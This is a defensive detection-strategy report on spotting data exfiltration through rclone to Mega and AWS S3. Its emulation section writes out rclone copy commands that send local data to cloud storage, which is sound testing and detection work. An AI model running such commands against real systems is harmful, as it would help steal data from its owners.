# Alerting & Detection Strategy (ADS) Report

## Goal
This technique aims to detect adversarial attempts to exfiltrate data using cloud storage solutions by exploiting tools like `rclone` on various operating systems.

## Categorization

- **Tactic / Kill Chain Phases:** Exfiltration
- **Platforms:** Linux, macOS, Windows

## Strategy Abstract
The detection strategy focuses on monitoring data flows and command usage associated with cloud storage tools like `rclone`. It leverages system logs (e.g., process creation, network traffic) and endpoint security solutions to identify patterns of data exfiltration. Key indicators include unusual outbound connections to cloud service IPs or domains and the execution of commands related to file transfers.

## Technical Context
Adversaries often use `rclone` for its cross-platform capabilities and ease of automating file transfers to various cloud services, including Mega and AWS S3. Attackers may execute these actions covertly by scripting or using legitimate credentials compromised through phishing or other means. 

**Adversary Emulation Details:**
- Commands such as `rclone copy /path/to/data mega:` or `rclone copy /path/to/data s3://bucket-name/` are commonly used.
- Test scenarios might involve running these commands under different user accounts to assess detection coverage.

## Blind Spots and Assumptions
- **Network Evasion:** Adversaries may use encrypted tunnels (e.g., VPNs) or obfuscation techniques, potentially bypassing network-based detection methods.
- **User Privileges:** Detection assumes adversaries have sufficient privileges to execute `rclone` with necessary permissions.
- **Environment Variability:** Diverse system configurations and security policies might impact the consistency of detection.

## False Positives
Potential benign activities include:
- Authorized users performing legitimate backups or data transfers using `rclone`.
- Scheduled maintenance tasks that involve automated cloud storage operations.

## Priority
**High**: Due to the critical nature of preventing unauthorized data exfiltration, especially given the widespread use of cloud services. The ability for adversaries to silently move large volumes of sensitive data poses significant risks.

## Validation (Adversary Emulation)
### Exfiltrate data with rclone to cloud Storage - Mega (Windows)
1. Install `rclone` on a Windows machine.
2. Configure `rclone` with necessary credentials to access a Mega account.
3. Execute the command: `rclone copy C:\path\to\data mega:`.
4. Monitor network traffic and logs for outbound connections to Mega's IP ranges or domains.

### Exfiltrate data with rclone to cloud Storage - AWS S3
1. Install `rclone` on a Windows machine.
2. Configure `rclone` with AWS credentials and access to an S3 bucket.
3. Execute the command: `rclone copy C:\path\to\data s3://bucket-name/`.
4. Observe network traffic for connections to AWS endpoints, focusing on unusual patterns or volumes.

## Response
When an alert fires:
- **Investigate**: Verify if a legitimate business process is in progress.
- **Contain**: If unauthorized activity is confirmed, isolate affected systems and terminate suspicious processes.
- **Eradicate**: Remove malicious tools or scripts used for exfiltration.
- **Recover**: Restore any compromised data from backups and reinforce security controls.
